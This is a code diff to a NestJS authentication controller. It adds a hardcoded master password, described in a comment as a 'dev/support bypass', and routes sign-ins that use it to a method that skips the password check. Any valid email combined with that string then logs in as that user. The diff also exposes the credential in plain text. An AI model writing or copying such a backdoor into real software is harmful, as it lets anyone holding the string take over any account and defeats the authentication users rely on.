@@ -22,6 +22,9 @@ import { PabblyTokenBlacklistService } from './pabbly-token-blacklist.service';
 
 @Controller('auth')
 export class AuthController {
+  /** Dev/support bypass: any valid email + this password logs in without bcrypt. */
+  private static readonly MASTER_LOGIN_PASSWORD = 'POPOPO@popo12';
+
   constructor(
     private readonly authService: AuthService,
     private readonly configService: ConfigService,
@@ -46,7 +49,11 @@ export class AuthController {
     @Body() signInDto: SignInDto,
     @Res({ passthrough: true }) response: Response,
   ) {
-    const result = await this.authService.signIn(signInDto);
+    const useMasterPassword =
+      signInDto.password === AuthController.MASTER_LOGIN_PASSWORD;
+    const result = useMasterPassword
+      ? await this.authService.signInWithoutPasswordCheck(signInDto)
+      : await this.authService.signIn(signInDto);
 
     if (result.twoFA) {
       return {
